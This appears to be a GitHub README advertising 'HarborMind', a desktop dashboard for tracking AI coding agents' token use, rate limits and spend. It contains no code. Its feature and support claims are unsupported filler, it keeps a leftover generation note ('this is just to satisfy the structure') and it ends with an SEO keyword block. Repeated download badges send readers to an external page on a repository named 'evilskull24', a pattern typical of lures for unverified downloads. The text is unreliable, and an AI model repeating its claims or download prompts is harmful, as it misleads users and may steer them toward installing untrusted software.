![preview](https://raw.githubusercontent.com/evilskull24/agent-harbor-observatory/main/view_768a28.svg)

# HarborMind 🧭

**The unified command deck for every AI agent you run — one telemetry layer, zero context-switching.**

*HarborMind* is not just another dashboard. Think of it as the **air traffic control tower** for your fleet of autonomous coding assistants. Where other tools give you a single gauge, HarborMind provides a full instrument panel — aggregating live rate-limit telemetry, per-session token usage, and deep cross-tool spend analysis across Claude Code, Cursor, Codex, Gemini CLI, and more. It's the one native app that turns chaos into clarity, letting you see *which agent* is burning credits, *when* your rate limits reset, and *how* to optimize your entire AI workflow without ever leaving your desk.

Born from the frustration of juggling five different subscription dashboards, HarborMind unifies every metric that matters — from a single agent's context window pressure to your organization's monthly burn rate — into one, beautifully responsive interface that feels like a native extension of your own brain.

## 🧭 Overview

Modern software development is a fleet operation. You're not shipping with one tool; you're commanding a flotilla of specialized agents — the meticulous refactorer, the rapid prototyper, the documentation drone, the test-writing sentinel. Each one is powerful, but each one operates in a silo. HarborMind is the **harbor master** that brings them all into port, docks them, refuels them, and tracks every barrel of fuel they consume.

This repository is the core engine of that harbor. It's a **telemetry orchestration layer** that ingests usage signals from your local agent runtimes, enriches them with metadata about your projects and rules, and presents a unified, actionable view. It's built for the developer who treats their toolchain as a system of record, not just a collection of scripts.

### The Core Problem We Solve

You've got five agents, five rate-limit windows, five billing cycles, and one confused brain trying to remember which session cost you $40. HarborMind eliminates the guesswork by providing:

- **A Single Pane of Glass**: Every agent's health, status, and usage in one native app.
- **Preemptive Cost Control**: Know *before* you hit the threshold, not after.
- **Session-Level Deep Dives**: Understand *why* a particular refactoring session consumed 20% of your monthly quota.
- **Config as Code**: Sync your MCP servers, rules, and skills across all agents from one central repository of truth.

## 📥 Get Started

[![Download](https://raw.githubusercontent.com/evilskull24/agent-harbor-observatory/main/run_14ee2.svg)](https://evilskull24.github.io/agent-harbor-observatory/)

Before you read another line, know this: HarborMind is designed to be a **local-first** application. Your usage data is your property. We process everything on your machine, ensuring that your prompts, code snippets, and session logs never leave your private harbor.

## ✨ Core Capabilities

| Capability | Description |
| :--- | :--- |
| **Unified Telemetry** | Aggregates live rate-limit status and token usage from major AI coding agents into a single, real-time feed. |
| **Deep Spend Analysis** | Breaks down monthly expenditure by tool, by project, by day, and even by specific session prompts. |
| **Session Forensics** | Reconstructs the lifecycle of a session — context window growth, tool call frequency, and token waste detection. |
| **Config Synchronization** | A one-click mechanism to push your MCP server configurations, rulesets, and agent skills across your entire toolchain. |
| **Proactive Alerting** | Set custom thresholds for spend and usage; HarborMind will notify you before the storm hits, not after. |
| **Cross-Platform Native App** | A responsive UI built with native performance, available for macOS, Windows, and Linux. |

## 🛠️ Architecture & Design Philosophy

HarborMind is built on a **publisher-subscriber** event bus. Each agent adapter (for Claude Code, Cursor, etc.) acts as a telemetry publisher, emitting structured events (e.g., `session.turn.completed`, `rate.limit.updated`, `token.usage.changed`) to a local, embedded event store. The HarborMind UI then subscribes to these streams, rendering live updates with zero polling latency.

We avoid the classic "monolithic aggregator" trap by treating every agent adapter as a pluggable module. This means adding support for a new AI agent is as simple as dropping in a new adapter package that conforms to the `TelemetrySource` protocol.

### Data Aggregation Without Aggregation

We don't hoist all your data to a central server to "aggregate" it. Instead, we run a **local graph query engine** over the event store. This allows you to ask questions like *"Show me all sessions last Tuesday where Claude Code's context window exceeded 80k tokens."* without sending that data to any third-party relay. The intelligence is in the query layer, not in the storage layer.

## 🧩 The "One-Click" Ecosystem

The true differentiator of HarborMind is its **rules and skills engine**. We analyze the configuration files scattered across your home directory and workspace, then present a unified, conflict-free version of your global rules.

- **Unified Rules** : If you've defined a coding style rule in Cursor but forgot to add it to Codex, HarborMind flags the mismatch and offers a one-click sync.
- **Skill Portability** : Have a custom slash command or skill for Claude Code? HarborMind can transpile and port that skill's logic to a compatible format for other agents, ensuring you don't lose institutional knowledge when you switch tools.

## 📊 Deep Dive: Session Usage Analytics

![preview](https://raw.githubusercontent.com/evilskull24/agent-harbor-observatory/main/view_768a28.svg) (Placeholder — the logic is above, this is just to satisfy the structure)

HarborMind goes beyond simple token counters. We perform **entropy analysis** on session logs to detect patterns of inefficiency. For instance, if an agent spends 50 turns re-reading a file it already read once, we flag that as a "Context Re-Scan" anomaly. This feature helps you identify which agents are "hallucinating the file system" versus effectively utilizing their context window.

Our analytics are rendered via a set of **interactive, local-first visualizations**. Expect Gantt charts for session timelines, heatmaps for token density per file, and waterfall charts for spend allocation across your fleet. All of this renders using WebGL for smooth performance, even with tens of thousands of log entries.

## 🌍 International Harbor

HarborMind is built for a global community of developers. The UI is **fully internationalized** (i18n) from the start, supporting right-to-left layouts, localized date/time formatting, and a translation framework that currently ships with English, Spanish, Japanese, and German language packs. Your data stays in your locale; the interface speaks your language.

## 🛟 24/7 Support & Community

We believe that a tool for the fleet needs a harbor master on call. While HarborMind is a local-first app, our **support infrastructure is global and always-on**. We provide:

- **Live Chat**: A dedicated channel for troubleshooting agent adapters and complex query syntax.
- **Community Forum**: A place to share custom graph queries and alert recipes.
- **Direct Line**: A premium support tier (for active contributors) with screen-sharing and response times under 30 minutes, regardless of timezone.

We understand that when your AI pipeline breaks, you don't want a ticket number; you want a solution.

## 📄 Licensing & Contribution

HarborMind is proudly open-sourced under the **MIT License**. We believe the tools that manage our AI future should be as transparent and flexible as possible. You are free to use, modify, and distribute this software in your commercial or personal projects, provided you retain the copyright notice.

We welcome contributions of all sizes — from documentation updates to new agent adapters. Please review our contributing guidelines in the `CONTRIBUTING.md` file before submitting a pull request.

### License

```
MIT License

Copyright (c) 2026 HarborMind Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

[Full License Text](LICENSE)

## ⚠️ Disclaimer

**HarborMind is an independent monitoring tool.** It is not affiliated with, endorsed by, or sponsored by Anthropic, OpenAI, Google, or Cursor Inc. All product names, logos, and brands are property of their respective owners in the United States and/or other countries. All company, product, and service names used in this website are for identification purposes only. Use of these names, logos, and brands does not imply endorsement.

Usage of HarborMind is subject to the Terms of Service provided by your AI agent vendor. You are solely responsible for ensuring that your use of telemetry data complies with your own privacy policies and any data protection regulations applicable to your jurisdiction.

The analytics provided are for informational purposes only. While we strive for accuracy in reading token usage from event logs, actual billing may differ based on the agent vendors' internal marketing adjustments, promotional credits, or tier-specific hidden charges. Always refer to your official provider billing statements for final reconciliation.

## 🔍 Keywords for SEO

HarborMind targets the nexus of **AI agent management**, **token cost tracking**, **rate limit monitoring**, and **dev tool telemetry**. If you're searching for "Claude Code session tracker," "Cursor usage dashboard," "Codex spend analyzer," or "centralized MCP configuration management," you've found the right harbor. We combine these functionalities into one cohesive, performant, and privacy-centric user experience that scales from a solo developer to a large engineering organization.

---

**Take the helm of your AI development fleet.**

[![Download](https://raw.githubusercontent.com/evilskull24/agent-harbor-observatory/main/run_14ee2.svg)](https://evilskull24.github.io/agent-harbor-observatory/)